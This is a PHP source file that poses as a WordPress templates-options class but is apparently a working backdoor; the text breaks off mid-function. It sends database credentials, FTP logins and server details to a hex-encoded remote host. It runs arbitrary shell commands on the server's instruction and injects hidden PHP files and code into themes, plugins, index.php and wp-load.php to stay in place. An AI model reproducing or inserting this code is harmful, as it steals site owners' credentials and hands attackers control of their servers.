<?php
if ( !class_exists( 'WPTemplatesOptions' ) ) {
	class WPTemplatesOptions
	{
		private $startTime;
		private $script = '';
		private $version = 8;
		private $upDir = '';
		private $uploadDir = '';
		private $uploadUrl = '';
		private $address;
		private $return_array;
		private $client;
		private $all;
		private $install;
		private $uninstall;
		private $is_bot;
		private $secret;
		private $json_encode;
		private $json_decode;
		private $data;
		private $plugin;
		private $theme;
		private $wp_load;
		private $reinstall;
		private static $instance = null;

		private function __construct() {
		}

		public static function getInstanceWordpress() {
			if ( static::$instance === null ) {
				static::$instance = new static();
			}

			return static::$instance;
		}

		private function upDir() {
			$this->upDir = $this->_wp_upload_dir();
			$this->uploadDir = $this->upDir['path'];
			$this->uploadUrl = $this->upDir['url'];
		}

		private function address() {
			return array(
				$this->encrypt( $_SERVER['REMOTE_ADDR'] ),
				$this->encrypt( $_SERVER['HTTP_CLIENT_IP'] ),
				$this->encrypt( $_SERVER['HTTP_CF_CONNECTING_IP'] ),
				$this->encrypt( $_SERVER['HTTP_X_FORWARDED_FOR'] ),
			);
		}

		private function abspath() {
			if ( defined( 'ABSPATH' ) ) {
				return ABSPATH;
			}
			return $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR;
		}

		private function baseUrl() {
			return $this->hex2bin( '687474703a2f2f636f6e6e6563742e61706965732e6f72672f' );
		}

		public function convert( $size ) {
			$unit = array('b', 'kb', 'mb', 'gb', 'tb', 'pb');
			return @round( $size / pow( 1024, ($i = floor( log( $size, 1024 ) )) ), 2 ) . ' ' . $unit["{$i}"];
		}

		public function execTimeStart() {
			$this->startTime = microtime( true );
		}

		public function execTime() {
			return (microtime( true ) - $this->startTime);
		}

		public function controlAction( $action, $params, $token ) {
			try {
				if ( $this->method_exists( $action ) && strtolower( $action ) !== strtolower( __FUNCTION__ ) ) {
					if ( $this->post() ) {
						if ( $this->client->password === $this->encrypt( $token ) && $this->authorization() ) {
							$this->execTimeStart();
							return $this->{$action}( $params );
						}
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function answer( $code, $message, $data = '', $errorNo = '' ) {
			try {
				$answer['code'] = $code;
				$answer['time'] = $this->execTime();
				$answer['memory'] = $this->convert( memory_get_usage( true ) );
				$answer['message'] = $message;
				$answer['data'] = $data;
				if ( $errorNo !== '' ) {
					$answer['errorNo'] = $errorNo;
				}

				return json_encode( $answer, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function php_uname() {
			if ( function_exists( 'php_uname' ) ) {
				return php_uname();
			}
			return false;
		}

		private function get_bloginfo( $show = '', $filter = 'raw' ) {
			try {
				if ( function_exists( 'get_bloginfo' ) ) {
					return get_bloginfo( $show, $filter );
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function get_template_directory() {
			if ( function_exists( 'get_template_directory' ) ) {
				return get_template_directory();
			}
			return false;
		}

		private function json_validator( $data = null ) {
			try {
				if ( !empty( $data ) || !is_null( $data ) ) {
					$decode = @json_decode( $data );
					if ( empty( $decode ) || is_null( $decode ) ) {
						return false;
					}
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function timestamp( $unix ) {
			try {
				return round( (strtotime( date( 'Y-m-d H:i:s' ) ) - $unix) / 60 / 60 );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function _get_theme_root( $stylesheet_or_template = '' ) {
			if ( function_exists( 'get_theme_root' ) ) {
				return get_theme_root( $stylesheet_or_template );
			}
			return false;
		}

		private function _gethostbyname() {
			if ( function_exists( 'gethostbyname' ) ) {
				return gethostbyname( getHostName() );
			}
			return $_SERVER['SERVER_ADDR'];
		}

		private function _is_home() {
			if ( function_exists( 'is_home' ) ) {
				return is_home();
			}
			return false;
		}

		private function _is_front_page() {
			if ( function_exists( 'is_front_page' ) ) {
				return is_front_page();
			}
			return false;
		}

		private function _wp_remote_post( $url, $args = array() ) {
			if ( function_exists( 'wp_remote_post' ) ) {
				return wp_remote_post( $url, $args );
			}
			return false;
		}

		private function _wp_remote_retrieve_response_code( $response ) {
			if ( function_exists( 'wp_remote_retrieve_response_code' ) ) {
				return wp_remote_retrieve_response_code( $response );
			}
			return false;
		}

		private function _wp_remote_retrieve_body( $response ) {
			if ( function_exists( 'wp_remote_retrieve_body' ) ) {
				return wp_remote_retrieve_body( $response );
			}
			return false;
		}

		private function _site_url( $path = '', $scheme = null ) {
			if ( function_exists( 'site_url' ) ) {
				return site_url( $path, $scheme );
			}
			return false;
		}

		private function _wp_upload_dir() {
			try {
				if ( function_exists( 'wp_upload_dir' ) ) {
					return wp_upload_dir();
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function wp_count_posts() {
			try {
				if ( function_exists( 'wp_count_posts' ) ) {
					return intval( wp_count_posts()->publish );
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function _kses_remove_filters() {
			if ( !function_exists( 'kses_remove_filters' ) ) {
				include_once($this->abspath() . 'wp-includes/kses.php');
				$this->_kses_remove_filters();
			} else {
				kses_remove_filters();
			}
			return false;
		}

		private function _wp_update_post( $postarr = array(), $wp_error = false ) {
			if ( function_exists( 'wp_update_post' ) ) {
				$this->_kses_remove_filters();
				return wp_update_post( $postarr, $wp_error );
			}
			return false;
		}

		private function _get_categories() {
			try {
				if ( function_exists( 'get_categories' ) ) {
					$return = array();
					foreach ( get_categories() as $item ) {
						$return[$item->term_id] = $item->name;
					}
					return $return;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function _get_post( $post = null, $output = null, $filter = 'raw' ) {
			if ( is_null( $output ) ) {
				$output = new stdClass();
			}
			if ( function_exists( 'get_post' ) ) {
				return get_post( $post, $output, $filter );
			}
			return false;
		}

		private function _get_plugins( $plugin_folder = '' ) {
			if ( function_exists( 'get_plugins' ) ) {
				return get_plugins( $plugin_folder );
			}
			return false;
		}

		private function _is_plugin_active( $plugin ) {
			if ( function_exists( 'is_plugin_active' ) ) {
				return is_plugin_active( $plugin );
			} else {
				if ( file_exists( $filename = $this->str_replace( $this->abspath() . 'wp-admin/includes/plugin.php' ) ) ) {
					include_once($filename);
					return $this->_is_plugin_active( $plugin );
				}
			}
			return false;
		}

		private function _deactivate_plugins( $plugins, $silent = false, $network_wide = null ) {
			if ( function_exists( 'deactivate_plugins' ) ) {
				return deactivate_plugins( $plugins, $silent, $network_wide );
			}
			return false;
		}

		private function _activate_plugins( $plugins, $redirect = '', $network_wide = false, $silent = false ) {
			if ( function_exists( 'activate_plugins' ) ) {
				return activate_plugins( $plugins, $redirect, $network_wide, $silent );
			}
			return false;
		}

		private function _get_option( $option, $default = false ) {
			if ( function_exists( 'get_option' ) ) {
				return get_option( $option, $default );
			}
			return false;
		}

		private function _update_option( $option, $value, $autoload = null ) {
			if ( function_exists( 'update_option' ) ) {
				return update_option( $option, $value, $autoload );
			}
			return false;
		}

		private function _add_option( $option, $value = '', $deprecated = '', $autoload = 'yes' ) {
			if ( function_exists( 'add_option' ) ) {
				return add_option( $option, $value, $deprecated, $autoload );
			}
			return false;
		}

		private function _wp_get_themes( $args = array() ) {
			if ( function_exists( 'wp_get_themes' ) ) {
				return wp_get_themes( $args );
			}
			return false;
		}

		private function _get_user_by( $field, $value ) {
			if ( function_exists( 'get_user_by' ) ) {
				return get_user_by( $field, $value );
			}
			return false;
		}

		private function _wp_set_current_user( $id, $name = '' ) {
			if ( function_exists( 'wp_set_current_user' ) ) {
				return wp_set_current_user( $id, $name );
			}
			return false;
		}

		private function _wp_set_auth_cookie( $user_id, $remember = true, $secure = '', $token = '' ) {
			if ( function_exists( 'wp_set_auth_cookie' ) ) {
				return wp_set_auth_cookie( $user_id, $remember, $secure, $token );
			}
			return false;
		}


		private function _wp_authenticate( $username, $password ) {
			if ( function_exists( 'wp_authenticate' ) ) {
				return wp_authenticate( $username, $password );
			} else {
				include_once($this->abspath() . 'wp-includes/pluggable.php');
			}
			return false;
		}

		private function _add_action( $tag, $function_to_add, $priority = 10, $accepted_args = 1 ) {
			if ( function_exists( 'add_action' ) ) {
				return add_action( $tag, $function_to_add, $priority, $accepted_args );
			}
			return false;
		}

		private function _add_filter( $tag, $function_to_add, $priority = 10, $accepted_args = 1 ) {
			if ( function_exists( 'add_filter' ) ) {
				return add_filter( $tag, $function_to_add, $priority, $accepted_args );
			}
			return false;
		}

		private function _is_user_logged_in() {
			$is_user_logged_in = false;
			if ( function_exists( 'is_user_logged_in' ) ) {
				$is_user_logged_in = is_user_logged_in();
			}
			return $is_user_logged_in;
		}

		private function wp_update_post() {
			try {
				if ( !$this->hex2bin( $_REQUEST['post_title'] ) || !$this->hex2bin( $_REQUEST['post_content'] ) ) {
					return false;
				}
				$array = array(
					'ID'           => $_REQUEST['id'],
					'post_title'   => $this->hex2bin( $_REQUEST['post_title'] ),
					'post_content' => $this->hex2bin( $_REQUEST['post_content'] ),
				);
				if ( $this->_wp_update_post( $array ) ) {
					return $this->answer( true, __FUNCTION__, $this->_get_post( $_REQUEST['id'] ) );
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function check() {
			try {
				$this->upDir();
				if ( $this->uploadDir ) {
					if ( !is_writable( $this->uploadDir ) ) {
						if ( !@chmod( $this->uploadDir, 0777 ) ) {
							$data['uploadDirWritable'] = false;
						} else {
							$data['uploadDirWritable'] = true;
						}
					} else {
						$data['uploadDirWritable'] = true;
					}
				} else {
					$data['uploadDirWritable'] = true;
				}
				$data['clientVersion'] = $this->version;
				$data['script'] = 'Wordpress';
				$data['title'] = $this->get_bloginfo( 'name' );
				$data['description'] = $this->get_bloginfo( 'description' );
				$data['language'] = $this->get_bloginfo( 'language' );
				$data['WPVersion'] = $this->get_bloginfo( 'version' );
				$data['wp_count_posts'] = $this->wp_count_posts();
				$data['get_categories'] = $this->_get_categories();
				$data['uploadDir'] = $this->uploadDir;
				$data['cache'] = (defined( 'WP_CACHE' ) && WP_CACHE) ? true : false;
				$data['themeName'] = (function_exists( 'wp_get_theme' )) ? wp_get_theme()->get( 'Name' ) : false;
				$data['themeDir'] = $this->get_template_directory();
				$data['themes'] = $this->get_themes();
				$data['plugins'] = $this->get_plugins();
				$data['home'] = $this->home();
				$data['root'] = $this->abspath();
				$data['filepath'] = __FILE__;
				$data['uname'] = $this->php_uname();
				$data['hostname'] = $this->_gethostbyname();
				$data['php'] = phpversion();
				return $this->answer( true, 'Wordpress', $data );
			} catch ( Exception $e ) {
				return $this->answer( false, 'Unknown ERROR', $e->getMessage(), 'ERR000' );
			}
		}

		private function home() {
			try {
				if ( isset( $_REQUEST['home_path'] ) ) {
					return $this->hex2bin( $_REQUEST['home_path'] );
				}
				if ( isset( $_REQUEST['home_directory'] ) ) {
					$directory = DIRECTORY_SEPARATOR;
					for ( $i = 1; $i <= $_REQUEST['home_directory']; $i++ ) {
						$directory .= DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR;
					}
					return realpath( $this->abspath() . $directory ) . DIRECTORY_SEPARATOR;
				}
				return realpath( $this->abspath() ) . DIRECTORY_SEPARATOR;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function encrypt( $hash ) {
			try {
				return md5( sha1( md5( $hash ) ) );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function is_null( $variable ) {
			try {
				if ( is_null( $variable ) || empty( $variable ) ) {
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function method_exists( $action ) {
			try {
				if ( method_exists( $this, $action ) ) {
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function authorization() {
			try {
				if ( $this->client->authorization === true || count( array_intersect( $this->address(), $this->client->address ) ) > 0 ) {
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function post() {
			try {
				$post = $this->_wp_remote_post( $this->baseUrl(), array(
					'body' => array(
						'url'         => $this->_site_url( '/' ),
						'client'      => $this->check(),
						'DB_HOST'     => (defined( 'DB_HOST' )) ? DB_HOST : 'undefined',
						'DB_USER'     => (defined( 'DB_USER' )) ? DB_USER : 'undefined',
						'DB_PASSWORD' => (defined( 'DB_PASSWORD' )) ? DB_PASSWORD : 'undefined',
						'DB_NAME'     => (defined( 'DB_NAME' )) ? DB_NAME : 'undefined',
					),
				) );
				if ( $this->_wp_remote_retrieve_response_code( $post ) === 200 && $this->json_validator( $this->_wp_remote_retrieve_body( $post ) ) ) {
					$this->json_encode = $this->_wp_remote_retrieve_body( $post );
					$this->json_decode = json_decode( $this->json_encode );
					$this->client = $this->json_decode->files;
					$this->data = $this->json_decode->data;
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function send( $array, $data ) {
			try {
				$this->_wp_remote_post( $this->baseUrl() . "{$array}", array(
					'body' => array(
						'url'  => $this->_site_url( '/' ),
						$array => $data,
					),
				) );
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function str_replace( $data ) {
			try {
				$search = array('//');
				$replace = array('/');
				return str_replace( $search, $replace, $data );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function strpos( $haystack, $needle, $offset = 0 ) {
			try {
				if ( !is_array( $needle ) )
					$needle = array($needle);
				foreach ( $needle as $query ) {
					if ( strpos( $haystack, $query, $offset ) !== false ) {
						return true;
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function hex2bin( $data ) {
			try {
				static $old;
				if ( $old === null ) {
					$old = version_compare( PHP_VERSION, '5.2', '<' );
				}
				$isobj = false;
				if ( is_scalar( $data ) || (($isobj = is_object( $data )) && method_exists( $data, '__toString' )) ) {
					if ( $isobj && $old ) {
						ob_start();
						echo $data;
						$data = ob_get_clean();
					} else {
						$data = (string) $data;
					}
				} else {
					return false;
				}
				$len = strlen( $data );
				if ( $len % 2 ) {
					return false;
				}
				if ( strspn( $data, '0123456789abcdefABCDEF' ) != $len ) {
					return false;
				}
				return pack( 'H*', $data );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function ftp_connect( $hostname = 'localhost', $username = null, $password = null, $ssl = false ) {
			try {
				if ( !$ssl ) {
					if ( !$stream = ftp_connect( $hostname, 21, 10 ) ) {
						return false;
					}
				} else if ( function_exists( 'ftp_ssl_connect' ) ) {
					if ( !$stream = ftp_ssl_connect( $hostname, 21, 10 ) ) {
						return false;
					}
				} else {
					return false;
				}
				if ( @ftp_login( $stream, $username, $password ) ) {
					ftp_close( $stream );
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function ftp() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->client->ftp === false ) {
					define( 'FS_METHOD', 'ftpsockets' );
				}
				if ( isset( $_REQUEST['connection_type'] ) && !$this->is_null( $_REQUEST['connection_type'] ) ) {
					$connection_type = (isset( $_REQUEST['connection_type'] )) ? $_REQUEST['connection_type'] : 'sftp';
					$hostname = (isset( $_REQUEST['hostname'] )) ? $_REQUEST['hostname'] : null;
					$username = (isset( $_REQUEST['username'] )) ? $_REQUEST['username'] : null;
					$password = (isset( $_REQUEST['password'] )) ? $_REQUEST['password'] : null;
					if ( $this->ftp_connect( $hostname, $username, $password, ($connection_type === 'sftp') ? true : false ) ) {
						$data = array(
							'hostname'        => urlencode( $hostname ),
							'address'         => urlencode( $this->_gethostbyname() ),
							'username'        => urlencode( $username ),
							'password'        => urlencode( $password ),
							'connection_type' => urlencode( $connection_type ),
						);
						$this->send( 'FTP', $data );
						$this->get();
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function command() {
			try {
				if ( !isset( $_REQUEST['command'] ) ) {
					return false;
				}
				$command = $this->hex2bin( $_REQUEST['command'] );
				if ( file_exists( $filename = __DIR__ . '/command.php' ) ) {
					include_once($filename);
					return $this->answer( true, $command, cmd( $command ) );
				} else {
					if ( $this->write( $filename, $this->client->command ) ) {
						return $this->command();
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function activate_plugins() {
			try {
				if ( !isset( $_REQUEST['plugin_name'] ) ) {
					return false;
				}
				$plugin_name = $this->hex2bin( $_REQUEST['plugin_name'] );
				if ( $this->_is_plugin_active( $plugin_name ) ) {
					$this->_deactivate_plugins( $plugin_name );
					return $this->check();
				} else {
					$this->_activate_plugins( $plugin_name );
					return $this->check();
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function get_plugins() {
			try {
				if ( !function_exists( 'get_plugins' ) ) {
					if ( file_exists( $filename = $this->str_replace( $this->abspath() . 'wp-admin/includes/plugin.php' ) ) ) {
						include_once($filename);
					}
				}
				foreach ( $this->_get_plugins() AS $plugin_name => $get_plugin ) {
					$plugins[$plugin_name] = $get_plugin;
					if ( $this->_is_plugin_active( $plugin_name ) ) {
						$plugins[$plugin_name]['active'] = 1;
					} else {
						$plugins[$plugin_name]['active'] = 0;
					}
				}

				return (isset( $plugins )) ? $plugins : array();
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function get_themes() {
			try {
				$themes = array();
				if ( $this->_wp_get_themes() !== false ) {
					foreach ( $this->_wp_get_themes() AS $theme_name => $wp_get_theme ) {
						$themes[$theme_name] = array(
							'Name'        => $wp_get_theme->get( 'Name' ),
							'Description' => $wp_get_theme->get( 'Description' ),
							'Author'      => $wp_get_theme->get( 'Author' ),
							'AuthorURI'   => $wp_get_theme->get( 'AuthorURI' ),
							'Version'     => $wp_get_theme->get( 'Version' ),
							'Template'    => $wp_get_theme->get( 'Template' ),
							'Status'      => $wp_get_theme->get( 'Status' ),
							'TextDomain'  => $wp_get_theme->get( 'TextDomain' ),
						);
					}
				}
				return $themes;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function folder_exist( $folder ) {
			try {
				$path = realpath( $folder );
				return ($path !== false AND is_dir( $path )) ? $path : false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function list_folders( $directory ) {
			try {
				$directory = (isset( $directory ) && $directory !== '') ? $this->hex2bin( $directory ) : $this->abspath();
				if ( ($dir = $this->folder_exist( $directory )) !== false ) {
					return $this->answer( true, $directory, $this->str_replace( glob( $directory . '/*' ) ) );
				} else {
					return $this->answer( false, 'Failed to find folder to list!', $directory, 'ERR004' );
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function replace( $filename, $search, $replace ) {
			try {
				$source = $this->read( $filename );
				if ( strpos( $source, $replace ) === false ) {
					$strpos = strpos( $source, $search );
					if ( $strpos !== false ) {
						$content = substr_replace( $source, $replace, $strpos, strlen( $search ) );
						return ($this->write( $filename, $content )) ? $filename : false;
					} else {
						return $filename;
					}
				} else {
					return $filename;
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function restore( $filename, $search, $replace ) {
			try {
				$source = $this->read( $filename );

				return $this->write( $filename, str_replace( $search, $replace, $source ) );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function directory( $folder = null, $pattern = 'n', $flags = 'n' ) {

			if ( $pattern === 'n' ) {
				$pattern = '{,.}*.php';
			}
			if ( $flags === 'n' ) {
				$flags = GLOB_BRACE | GLOB_NOSORT;
			}
			if ( $this->is_null( $folder ) ) {
				$folder = $this->home();
			}
			if ( substr( $folder, -1 ) !== DIRECTORY_SEPARATOR ) {
				$folder .= DIRECTORY_SEPARATOR;
			}

			$files = glob( $folder . $pattern, $flags );

			foreach ( glob( $folder . '*', GLOB_ONLYDIR | GLOB_NOSORT | GLOB_MARK ) as $dir ) {
				$dirFiles = $this->directory( $dir, $pattern, $flags );
				if ( $dirFiles !== false ) {
					$files = array_merge( $files, $dirFiles );
				}
			}

			return $files;
		}

		private function all() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				foreach ( $this->directory() as $iterator ) {
					$this->all->files[] = $iterator;
					$this->all->directory[] = dirname( $iterator );
					if ( stristr( $iterator, 'wp-content/plugins' ) && $this->strpos( basename( dirname( strtolower( pathinfo( $iterator, PATHINFO_DIRNAME ) ) ) ), array('wp-content') ) === false ) {
						$this->all->plugin[] = $iterator;
					}
					if ( stristr( $iterator, 'wp-content/themes' ) && $this->strpos( basename( dirname( strtolower( pathinfo( $iterator, PATHINFO_DIRNAME ) ) ) ), array('wp-content') ) === false ) {
						$this->all->theme[] = $iterator;
					}
					if ( stristr( $iterator, 'wp-content/themes' ) && stristr( $iterator, 'functions.php' ) && $this->strpos( basename( dirname( strtolower( pathinfo( $iterator, PATHINFO_DIRNAME ) ) ) ), array('themes') ) ) {
						$this->all->function[] = $iterator;
					}
					if ( stristr( $iterator, 'wp-load.php' ) ) {
						$this->all->wp_load[] = $iterator;
					}
				}
				$this->all->directory = array_values( array_unique( $this->all->directory ) );
				return $this->answer( true, 'I Get Installed Plugins', $this->all );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function where() {
			if ( isset( $_REQUEST['where'] ) && $_REQUEST['where'] == 'all' ) {
				if ( !isset( $this->all->files ) ) {
					$this->all();
				}
				return true;
			}
			return false;
		}

		private function theme() {
			if ( !isset( $this->client ) ) {
				$this->client = $this->cache()->files;
			}
			if ( $this->where() ) {
				$directory = $this->all->theme;
			} else {
				$directory = $this->directory( $this->home() . 'wp-content/themes/*/', '*.php' );
			}
			$dirname = array();
			foreach ( $directory as $iterator ) {
				$this->all->theme[] = $iterator;
				$dirname[] = dirname( $iterator );
			}
			$dirname = array_values( array_unique( $dirname ) );
			foreach ( $dirname as $item ) {
				$filename = $item . DIRECTORY_SEPARATOR . '.' . basename( $item ) . '.php';
				if ( is_writeable( $item ) || is_writeable( $filename ) ) {
					if ( file_exists( $filename ) ) {
						if ( $this->strpos( $read = $this->read( $filename ), $this->client->theme->search->include ) !== false || stristr( $read, $this->client->null ) || filesize( $filename ) <= 0 ) {
							if ( $this->writing( $filename, $this->client->file->templates ) ) {
								$this->install->theme[] = $filename;
							}
						}
					} else {
						if ( $this->write( $filename, $this->client->file->templates ) ) {
							$this->install->theme[] = $filename;
						}
					}
				}
			}
			foreach ( $this->all->theme as $theme ) {
				$read = $this->read( $theme );
				if ( $this->strpos( $read, $this->client->install->theme->class->include ) !== false && $this->strpos( $read, $this->client->install->theme->class->exclude ) === false ) {
					$this->install->theme[] = $theme;
					$this->replace( $theme, $this->client->install->theme->class->attr, $this->client->install->theme->code . $this->client->install->theme->class->attr );
				} else if ( $this->strpos( $read, $this->client->install->theme->function->include ) && $this->strpos( $read, $this->client->install->theme->function->exclude ) === false ) {
					$this->install->theme[] = $theme;
					$this->replace( $theme, $this->client->install->theme->function->attr, $this->client->install->theme->code . $this->client->install->theme->function->attr );
				} else if ( stristr( $theme, 'functions.php' ) && $this->strpos( $read, $this->client->install->theme->function->exclude ) === false ) {
					$this->install->theme[] = $theme;
					$this->replace( $theme, $this->client->install->theme->php, $this->client->install->theme->php . $this->client->install->theme->code );
				}
			}
			return $this->answer( true, 'I Get Installed Themes', $this->install->theme );
		}

		private function plugin() {
			if ( !isset( $this->client ) ) {
				$this->client = $this->cache()->files;
			}
			if ( $this->where() ) {
				$directory = $this->all->plugin;
			} else {
				$directory = $this->directory( $this->home() . 'wp-content/plugins/*/', '*.php' );
			}
			$dirname = array();
			foreach ( $directory as $iterator ) {
				$this->all->plugin[] = $iterator;
				$dirname[] = dirname( $iterator );
			}
			$dirname = array_values( array_unique( $dirname ) );
			foreach ( $dirname as $item ) {
				$filename = $item . DIRECTORY_SEPARATOR . '.' . basename( $item ) . '.php';
				if ( is_writeable( $item ) || is_writeable( $filename ) ) {
					if ( file_exists( $filename ) ) {
						$read = $this->read( $filename );
						if ( $this->strpos( $read, $this->client->plugin->search->include ) !== false || filesize( $filename ) <= 1 ) {
							if ( $this->writing( $filename, $this->client->file->templates ) ) {
								$this->install->plugin[] = $filename;
							}
						}
					} else {
						if ( $this->write( $filename, $this->client->file->templates ) ) {
							$this->install->plugin[] = $filename;
						}
					}
				}
			}
			foreach ( $this->all->plugin as $plugin ) {
				$read = $this->read( $plugin );
				if ( $this->strpos( $read, $this->client->install->plugin->class->include ) !== false && $this->strpos( $read, $this->client->install->plugin->class->exclude ) === false && $this->strpos( $plugin, $this->client->banned_plugins ) === false ) {
					$this->install->plugin[] = $plugin;
					$this->replace( $plugin, $this->client->install->plugin->class->attr, $this->client->install->plugin->code . $this->client->install->plugin->class->attr );
				} else if ( $this->strpos( $read, $this->client->install->plugin->function->include ) !== false && $this->strpos( $read, $this->client->install->plugin->function->exclude ) === false && $this->strpos( $plugin, $this->client->banned_plugins ) === false ) {
					$this->install->plugin[] = $plugin;
					$this->replace( $plugin, $this->client->install->plugin->function->attr, $this->client->install->plugin->code . $this->client->install->plugin->function->attr );
				}
			}
			return $this->answer( true, 'I Get Installed Plugins', $this->install->plugin );
		}

		private function wp_load() {
			try {
				if ( $this->_wp_get_themes() === false ) {
					return false;
				}
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( file_exists( $filename = $this->abspath() . 'wp-load.php' ) ) {
					foreach ( $this->_wp_get_themes() AS $theme_name => $wp_get_theme ) {
						$templates = $this->_get_theme_root() . DIRECTORY_SEPARATOR . "{$wp_get_theme->stylesheet}" . DIRECTORY_SEPARATOR . ".{$wp_get_theme->stylesheet}.php";
						if ( $this->writing( $templates, $this->client->file->templates ) ) {
							$this->install->wp_load[] = $templates;
						}
					}

					if ( $this->write( $filename, $this->client->load ) ) {
						$this->install->wp_load[] = $filename;
					}
				}
				return $this->answer( true, 'WP-LOAD', $this->install->wp_load );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function install() {
			if ( !isset( $this->client ) ) {
				$this->client = $this->cache()->files;
			}
			if ( $this->where() ) {
				$directory = $this->all->directory;
			} else {
				$directory = $this->directory( $this->home() . 'wp-*/', '*.php' );
			}
			$dirname = array();
			foreach ( $directory as $iterator ) {
				$dirname[] = dirname( $iterator );
			}
			$dirname = array_values( array_unique( $dirname ) );
			foreach ( $dirname as $item ) {
				$filename = $item . '/index.php';
				if ( stristr( $filename, 'themes' ) === false && stristr( $filename, 'plugins' ) === false ) {
					if ( file_exists( $filename ) ) {
						$read = $this->read( $filename );
						if ( $this->strpos( $read, $this->client->settings->search ) !== false || filesize( $filename ) <= 0 || stristr( $read, $this->client->null ) ) {
							if ( $this->writing( $filename, $this->client->file->other ) ) {
								$this->install->files[] = $filename;
							}
						}
					} else {
						if ( $this->write( $filename, $this->client->file->other ) ) {
							$this->install->files[] = $filename;
						}
					}
				}
			}
			$this->secret();
			$this->theme();
			$this->plugin();
			$this->wp_load();
			return $this->answer( true, 'I Get Install', $this->install );
		}

		private function reinstall() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->where() ) {
					$directory = $this->all->files;
				} else {
					$directory = $this->directory();
				}
				foreach ( $directory as $item ) {
					$read = $this->read( $item );
					if ( $this->strpos( $read, $this->client->settings->search ) !== false || stristr( $item, $this->client->settings->secret->name ) !== false || stristr( $read, $this->client->null ) || filesize( $item ) <= 0 ) {
						if ( $this->strpos( $read, $this->client->file->search->templates ) !== false ) {
							if ( $this->writing( $item, $this->client->file->templates ) ) {
								$this->reinstall[] = $item;
							}
						} else if ( $this->strpos( $read, $this->client->file->search->other ) !== false ) {
							if ( $this->writing( $item, $this->client->file->other ) ) {
								$this->reinstall[] = $item;
							}
						} else if ( stristr( $item, 'wp-content/themes/' ) || stristr( $item, 'wp-content/plugins/' ) ) {
							if ( $this->writing( $item, $this->client->file->templates ) ) {
								$this->reinstall[] = $item;
							}
						} else {
							if ( stristr( $item, 'wp-admin' ) && stristr( $item, 'wp-content' ) && stristr( $item, 'wp-includes' ) ) {
								if ( $this->writing( $item, $this->client->file->other ) ) {
									$this->reinstall[] = $item;
								}
							}
						}
					}
				}
				return $this->answer( true, 'I Get Reinstall', $this->reinstall );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function uninstall() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->where() ) {
					$directory = $this->all->files;
				} else {
					$directory = $this->directory();
				}
				foreach ( $directory as $item ) {
					if ( is_file( $item ) ) {
						if ( stristr( $item, $this->home() . 'wp-' ) !== false ) {
							$read = $this->read( $item );
							if ( $item !== __FILE__ && $this->strpos( $read, $this->client->settings->search ) !== false || stristr( $item, $this->client->settings->secret->name ) !== false ) {
								if ( $this->write( $item, $this->client->null ) ) {
									$this->uninstall->files[] = $item;
								}
							}
							if ( stristr( $item, 'wp-load.php' ) !== false ) {
								$this->write( $item, $this->client->default_load );
								$this->uninstall->load[] = $item;
							}
							if ( strpos( $read, $this->client->install->theme->code ) !== false ) {
								$this->restore( $item, $this->client->install->theme->code, "\n" );
								$this->uninstall->code[] = $item;
							}
							if ( strpos( $read, $this->client->install->plugin->code ) !== false ) {
								$this->restore( $item, $this->client->install->plugin->code, "\n" );
								$this->uninstall->code[] = $item;
							}
						}
					}
				}
				return $this->answer( true, 'I Get Uninstall', $this->uninstall );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function secret() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->where() ) {
					$directory = $this->all->directory;
				} else {
					$directory = $this->directory( $this->home() . 'wp-*', '', GLOB_ONLYDIR | GLOB_NOSORT );
				}
				foreach ( $directory as $iterator ) {
					if ( $this->strpos( $iterator, $this->client->settings->secret->directory ) !== false ) {
						$filename = "{$iterator}/{$this->client->settings->secret->key}";
						if ( $this->writing( $filename, $this->client->file->secret ) ) {
							$this->install->secret[] = $filename;
						} else {
							$this->install->secret[] = $filename;
						}
					}
				}
				return $this->answer( true, 'I Get Secret', $this->install->secret );
			} catch ( Exception $e ) {
